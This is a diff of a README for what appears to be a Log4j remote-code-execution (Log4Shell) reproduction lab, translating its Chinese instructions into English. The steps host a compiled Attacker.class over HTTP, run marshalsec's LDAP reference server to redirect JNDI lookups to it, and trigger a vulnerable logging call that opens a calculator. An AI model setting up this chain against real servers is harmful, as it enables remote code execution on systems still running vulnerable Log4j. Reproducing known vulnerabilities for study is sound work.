@@ -1,16 +1,22 @@
-## 准备
+[中文](https://github.com/Cyronlee/log4j-rce/blob/main/README-zh.md)
 
-`remote/Attacker.class`使用`Java 1.8.0_292`编译
+## Prepare
 
-版本不同的朋友可以自己用`javac Attacker.java`编译
+The `remote/Attacker.class` is already compiled with `Java 1.8.0_292`.
 
-## 复现步骤
+You can use `javac Attacker.java` to compile it if you're using another version.
 
-复现一共需要启动3个进程，成功触发会打印`Constructor`并自动打开计算器
+## Reproduce Steps
 
-### 1 攻击者服务
+Total of 3 processes are required to reproduce it. 
 
-使用`python`托管`Attacker.class`
+If Successfully triggered, 
+
+The console will print `Constructor` and the calculator will be opened automatically.
+
+### 1 Attacker service
+
+Use `python` to host `Attacker.class` file:
 
 ```
 cd remote
@@ -18,9 +24,9 @@ cd remote
 python -m http.server 8888
 ```
 
-### 2 jndi转发
+### 2 jndi forwarding
 
-使用`marshalsec`工具转发jndi请求到攻击者服务
+Use the `marshalsec` tool to forward jndi requests to the attacker's service:
 
 ```
 git clone git@github.com:mbechler/marshalsec.git
@@ -32,8 +38,6 @@ mvn clean package -DskipTests
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Attacker"
 ```
 
-### 3 漏洞触发
+### 3 Trigger
 
-使用命令行或IDE运行`src/main/java/LogService.java`
-
-
+Use the command line or IDE to run `src/main/java/LogService.java`
